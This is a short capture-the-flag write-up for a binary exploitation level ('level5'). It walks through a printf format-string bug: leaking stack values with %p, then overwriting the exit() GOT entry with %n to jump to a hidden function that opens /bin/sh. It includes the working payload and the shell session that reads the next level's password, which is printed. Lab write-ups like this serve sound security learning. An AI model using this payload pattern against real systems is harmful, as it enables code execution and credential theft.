# level 5

There is an exec level5, we bring to local data.
We have 3 functions, main() calling n() and fn o() which has a call to /bin/sh but is never called by the program. We're going to find a way to call o().

There is a call to printf in fn n(), we have to find from what byte we have access.

    (python -c 'print "aaaabbbbcccc" + " %p" * 10') | ./level5 
    aaaabbbbcccc 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x62626262 0x63636363 0x20702520 0x25207025 0x70252070 0x20702520

## addresses

o()
    `080484a4`

exit() GOT : (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses.
    `0x8049838`

We need to redirect from printf to the address of o(), 080484a4 == 134513828
from this we have
o address - 4 bytes
padding - 134513824 bytes

    $ (python -c 'print ("\x38\x98\x04\x08" + "%134513824c" + "%4$n")'; cat ) | ./level5
    whoami
    level6
    pwd
    /home/user/level5
    cat /home/user/level6/.pass
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
